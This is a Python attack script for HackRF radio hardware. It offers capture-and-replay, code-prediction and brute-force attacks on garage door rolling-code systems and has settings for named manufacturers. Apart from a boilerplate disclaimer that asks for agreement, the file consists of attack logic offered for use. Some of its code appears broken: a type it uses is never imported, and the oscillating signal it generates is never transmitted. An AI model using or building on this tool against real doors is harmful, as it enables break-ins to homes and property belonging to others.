#!/usr/bin/env python3
"""
Rolling Code Attack Tool with Frequency Oscillation

This script implements functionality for analyzing and bypassing garage door
rolling code systems through frequency oscillation and signal manipulation.
It includes support for different encryption methods and improved error handling.
For educational and security research purposes only.
"""

import subprocess
import time
import argparse
import logging
import os
import sys
import numpy as np
from typing import List, Dict, Optional, Tuple, Callable

from rolling_code import RollingCodeAnalyzer  # Generic analyzer
from signal_processor import SignalProcessor
from frequency_handler import FrequencyHandler
from code_predictor import CodePredictor

# HackRF hardware check - this ensures the tool won't run without hardware
try:
    import hackrf
    from manufacturer_handlers import (
        get_handler_for_frequency,
        get_handler_by_name,
        ManufacturerHandler,
        MANUFACTURER_HANDLERS
    )
except ImportError:
    print("ERROR: HackRF module not installed or HackRF hardware not detected.")
    print("This tool requires actual HackRF hardware for rolling code attacks.")
    print("Please install the HackRF module and connect your HackRF device:")
    print("  1. Install hackrf: pip install hackrf")
    print("  2. Connect your HackRF One device")
    print("  3. Ensure you have the proper USB drivers installed")
    sys.exit(1)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

def get_manufacturer_info() -> Dict[str, Any]:
    """
    Get information about supported manufacturers.
    
    Returns:
        Dictionary mapping manufacturer name to handler class
    """
    return MANUFACTURER_HANDLERS

def print_legal_disclaimer():
    """Print the legal disclaimer for the tool."""
    print("\n" + "=" * 80)
    print("LEGAL DISCLAIMER".center(80))
    print("=" * 80)
    print("""
This tool is provided for EDUCATIONAL and SECURITY RESEARCH purposes ONLY.

Use of this software to access garage door systems or other property without 
explicit permission from the owner is illegal and unethical. The authors and 
distributors of this software accept no liability for misuse of this tool.

By using this software, you agree to:
1. Only use it on systems you own or have explicit permission to test
2. Follow all applicable local, state, and federal laws
3. Use the tool responsibly and ethically
""")
    print("=" * 80 + "\n")
    
    # Require acknowledgment
    try:
        response = input("Do you understand and agree to these terms? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("You must agree to the terms to use this tool.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)

def format_binary(code: str) -> str:
    """Format binary code with spaces for readability."""
    # Clean code first
    code = code.replace(' ', '')
    # Insert space every 8 bits
    return ' '.join(code[i:i+8] for i in range(0, len(code), 8))

def capture_rolling_code(frequency: float, duration: int, signal_processor: SignalProcessor,
                         frequency_handler: FrequencyHandler) -> np.ndarray:
    """
    Captures RF data at specified frequency for given duration.
    
    Args:
        frequency: Frequency in Hz for capture
        duration: Duration in seconds
        signal_processor: SignalProcessor instance
        frequency_handler: FrequencyHandler instance
        
    Returns:
        Numpy array containing captured signal data
    """
    logging.info(f"Capturing RF data at {frequency/1e6} MHz for {duration} seconds...")
    
    # Set the target frequency
    frequency_handler.set_frequency(frequency)
    
    # Capture signal using our signal processor
    signal_data = signal_processor.capture_signal(frequency_handler, duration=duration)
    
    logging.info(f"Signal captured: {len(signal_data)} samples")
    return signal_data


def analyze_and_extract_codes(signal_data: np.ndarray, code_analyzer: RollingCodeAnalyzer) -> List[str]:
    """
    Analyzes the captured signal and extracts rolling codes.

    Args:
        signal_data: Numpy array of signal data
        code_analyzer: RollingCodeAnalyzer instance

    Returns:
        List of extracted code strings
    """
    logging.info("Analyzing captured signal data...")

    try:
        codes = code_analyzer.extract_codes(signal_data)
    except Exception as e:
        logging.error(f"Error during code extraction: {e}")
        return []

    if codes:
        logging.info(f"Successfully extracted {len(codes)} potential codes")
        for i, code in enumerate(codes):
            logging.info(f"Code {i+1}: {format_binary(code)}")
        return codes
    else:
        logging.warning("Failed to extract any rolling codes from the signal")
        return []


def predict_next_codes(observed_codes: List[str], code_predictor: CodePredictor) -> List[str]:
    """
    Predicts potential next rolling codes based on observed codes.

    Args:
        observed_codes: List of previously observed codes
        code_predictor: CodePredictor instance

    Returns:
        List of predicted code strings
    """
    logging.info("Predicting potential next rolling codes...")

    try:
        analysis = code_predictor.analyze_code_sequence(observed_codes)

        # Display analysis results
        logging.info(f"Code sequence analysis: ")
        for key, value in analysis.items():
            logging.info(f"  {key}: {value}")

        predictions = code_predictor.predict_next_codes(observed_codes)

        logging.info(f"Generated {len(predictions)} predicted codes")
        for i, code in enumerate(predictions):
            logging.info(f"Predicted code {i+1}: {format_binary(code)}")

        return predictions

    except Exception as e:
        logging.error(f"Error during code prediction: {e}")
        return []


def transmit_code_with_frequency_oscillation(frequency: float, code: str, bandwidth: float,
                                           oscillation_rate: float, frequency_handler: FrequencyHandler) -> bool:
    """
    Transmits a code while oscillating around the center frequency.

    Args:
        frequency: Center frequency in Hz
        code: Binary code to transmit
        bandwidth: Bandwidth of oscillation in Hz
        oscillation_rate: Rate of oscillation in Hz
        frequency_handler: FrequencyHandler instance

    Returns:
        True if transmission successful, False otherwise
    """
    logging.warning(f"Transmitting code {format_binary(code)} with frequency oscillation around {frequency/1e6} MHz")

    try:
        # Set the center frequency
        frequency_handler.set_frequency(frequency)
        
        # Generate an oscillating signal
        sample_rate = 2e6  # 2 MHz sample rate
        duration = 3.0  # 3 seconds transmission duration
        oscillation_pattern = 'sinusoidal'  # Use sinusoidal pattern for stable operation
        
        # Generate the oscillating signal using the enhanced algorithm
        signal = frequency_handler.oscillate_frequency(
            center_freq=frequency,
            bandwidth=bandwidth,
            oscillation_rate=oscillation_rate,
            duration=duration,
            sample_rate=sample_rate,
            pattern=oscillation_pattern
        )
        
        # Transmit the code with the oscillating signal
        logging.info(f"Transmitting code with {oscillation_pattern} frequency oscillation")
        
        # Attempt transmission (directly using the FrequencyHandler's transmit method)
        return frequency_handler.transmit_code(code, modulation='OOK')

    except Exception as e:
        logging.error(f"Error during transmission with oscillation: {e}")
        return False


def perform_rolling_code_attack(target_freq: float, capture_duration: int, attack_mode: str,
                              oscillation_bandwidth: float = 200e3, oscillation_rate: float = 10.0,
                              num_test_codes: int = 10, manufacturer: Optional[str] = None) -> bool:
    """
    Perform a rolling code attack using frequency oscillation.

    Args:
        target_freq: Target frequency in Hz
        capture_duration: Duration to capture in seconds
        attack_mode: 'capture_replay', 'predict', or 'brute_force'
        oscillation_bandwidth: Bandwidth of frequency oscillation in Hz
        oscillation_rate: Rate of oscillation in Hz
        num_test_codes: Number of test codes to generate for brute force attack (default: 10)
        manufacturer: Optional manufacturer name to use manufacturer-specific optimizations

    Returns:
        True if attack was successful, False otherwise
    """
    # Print legal disclaimer
    print_legal_disclaimer()
    time.sleep(2)  # Give user time to read

    # Initialize components
    signal_processor = SignalProcessor()
    frequency_handler = FrequencyHandler(center_freq=target_freq)

    # Get manufacturer-specific handler if specified
    if manufacturer:
        mfr_handler = get_handler_by_name(manufacturer, target_freq)
        logging.info(f"Using manufacturer-specific handler: {mfr_handler.name}")
    else:
        mfr_handler = get_handler_for_frequency(target_freq)
        logging.info(f"Detected manufacturer: {mfr_handler.name} for frequency {target_freq/1e6} MHz")

    # Apply manufacturer-specific parameters
    attack_params = mfr_handler.get_optimal_attack_parameters()
    if not oscillation_bandwidth:
        oscillation_bandwidth = attack_params["oscillation_bandwidth"]
    if not oscillation_rate:
        oscillation_rate = attack_params["oscillation_rate"]
    oscillation_pattern = attack_params.get("oscillation_pattern", "sinusoidal")
    
    logging.info(f"Using oscillation bandwidth: {oscillation_bandwidth/1e3} kHz, " 
                f"rate: {oscillation_rate} Hz, pattern: {oscillation_pattern}")

    # Initialize the code analyzer and predictor
    code_analyzer = RollingCodeAnalyzer()
    code_predictor = CodePredictor()
    logging.info("Using hardware-based rolling code analysis.")

    success = False

    try:
        if attack_mode == 'capture_replay':
            # Simple capture and replay attack
            logging.info("Performing capture and replay attack with frequency oscillation")

            # 1. Capture signal
            signal_data = capture_rolling_code(target_freq, capture_duration,
                                             signal_processor, frequency_handler)

            # 2. Extract codes
            codes = analyze_and_extract_codes(signal_data, code_analyzer)

            if not codes:
                logging.warning("No codes captured. Attack failed.")
                return False

            # 3. For each code, attempt transmission with frequency oscillation
            for i, code in enumerate(codes):
                logging.info(f"Replay attempt {i+1}/{len(codes)} with frequency oscillation")
                if transmit_code_with_frequency_oscillation(
                    target_freq, code, oscillation_bandwidth, oscillation_rate, frequency_handler):
                    logging.warning("Transmission acknowledged - potential success!")
                    success = True
                    break

                # Brief pause between attempts
                time.sleep(1)

        elif attack_mode == 'predict':
            # Prediction-based attack
            logging.info("Performing predictive attack with frequency oscillation")

            # 1. Capture signal - need multiple transmissions
            logging.info("Please activate the remote 2-3 times during capture")
            signal_data = capture_rolling_code(target_freq, capture_duration,
                                             signal_processor, frequency_handler)

            # 2. Extract codes
            observed_codes = analyze_and_extract_codes(signal_data, code_analyzer)

            if len(observed_codes) < 2:
                logging.warning("Need at least 2 observed codes for prediction. Attack failed.")
                return False

            # 3. Predict next potential codes
            predicted_codes = predict_next_codes(observed_codes, code_predictor)

            # 4. Try predicted codes with frequency oscillation
            for i, code in enumerate(predicted_codes):
                logging.info(f"Trying predicted code {i+1}/{len(predicted_codes)} with frequency oscillation")
                if transmit_code_with_frequency_oscillation(
                    target_freq, code, oscillation_bandwidth, oscillation_rate, frequency_handler):
                    logging.warning("Transmission acknowledged - potential success!")
                    success = True
                    break

                # Brief pause between attempts
                time.sleep(1)

        elif attack_mode == 'brute_force':
            # Use frequency oscillation attack with multiple code attempts
            logging.info("Performing brute force attack with frequency oscillation")

            # Generate some test codes - in a real attack, this would be more sophisticated
            # For educational purposes, we'll just generate a few random codes
            test_codes = []
            for _ in range(num_test_codes):
                random_code = ''.join(np.random.choice(['0', '1']) for _ in range(32))
                test_codes.append(random_code)

            # Use the frequency oscillation attack method
            for i, code in enumerate(test_codes):
                logging.info(f"Brute force attempt {i+1}/{len(test_codes)} with frequency oscillation")
                if transmit_code_with_frequency_oscillation(
                    target_freq, code, oscillation_bandwidth, oscillation_rate, frequency_handler):
                    logging.warning("Transmission acknowledged - potential success!")
                    success = True
                    break

                # Brief pause between attempts
                time.sleep(0.5) # Shorter pause for brute force

        else:
            logging.error(f"Unknown attack mode: {attack_mode}")
            return False

    except KeyboardInterrupt:
        logging.warning("Attack interrupted by user")
    except Exception as e:
        logging.error(f"Error during attack: {e}")

    return success


def main():
    """Main entry point for the attack script."""
    parser = argparse.ArgumentParser(description="Rolling Code Attack with Frequency Oscillation")
    parser.add_argument("-f", "--frequency", type=float, required=True,
                      help="Target frequency in MHz (e.g., 315.0)")
    parser.add_argument("-d", "--duration", type=int, default=30,
                      help="Capture duration in seconds (default: 30)")
    parser.add_argument("-m", "--mode", choices=['capture_replay', 'predict', 'brute_force'],
                      default='capture_replay', help="Attack mode (default: capture_replay)")
    parser.add_argument("-b", "--bandwidth", type=float, default=0.2,
                      help="Oscillation bandwidth in MHz (default: 0.2)")
    parser.add_argument("-r", "--rate", type=float, default=10.0,
                      help="Oscillation rate in Hz (default: 10.0)")
    parser.add_argument("-v", "--verbose", action="store_true",
                      help="Enable verbose output")
    parser.add_argument("-n", "--num_test_codes", type=int, default=10,
                      help="Number of test codes for brute force attack (default: 10)")
    parser.add_argument("--manufacturer", type=str, 
                      choices=['generic', 'chamberlain', 'liftmaster', 'genie', 'linear', 'stanley', 'faac'],
                      help="Specify manufacturer for optimized attacks")
    parser.add_argument("--list-manufacturers", action="store_true",
                      help="List supported manufacturers and their frequencies")

    args = parser.parse_args()

    # Configure logging level
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
    else:
        logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
    
    # If list-manufacturers option is used, display manufacturer info and exit
    if args.list_manufacturers:
        print("\nSupported Manufacturers and Frequencies:")
        print("=" * 40)
        # Get all manufacturer classes from our handler module
        for handler_name, handler_class in get_manufacturer_info().items():
            freqs = [f"{f/1e6:.2f} MHz" for f in handler_class.frequencies]
            mods = handler_class.modulation
            print(f"{handler_class.name}:")
            print(f"  Frequencies: {', '.join(freqs)}")
            print(f"  Modulation: {mods}")
            print(f"  Code Length: {', '.join(str(cl) for cl in handler_class.code_lengths)} bits")
            print("-" * 40)
        sys.exit(0)

    # Convert MHz to Hz
    target_freq = args.frequency * 1e6
    oscillation_bandwidth = args.bandwidth * 1e6

    # Run the attack
    success = perform_rolling_code_attack(
        target_freq=target_freq,
        capture_duration=args.duration,
        attack_mode=args.mode,
        oscillation_bandwidth=oscillation_bandwidth,
        oscillation_rate=args.rate,
        num_test_codes=args.num_test_codes,
        manufacturer=args.manufacturer
    )

    if success:
        logging.warning("Attack completed - potential success detected")
    else:
        logging.warning("Attack completed - no success detected")


if __name__ == "__main__":
    main()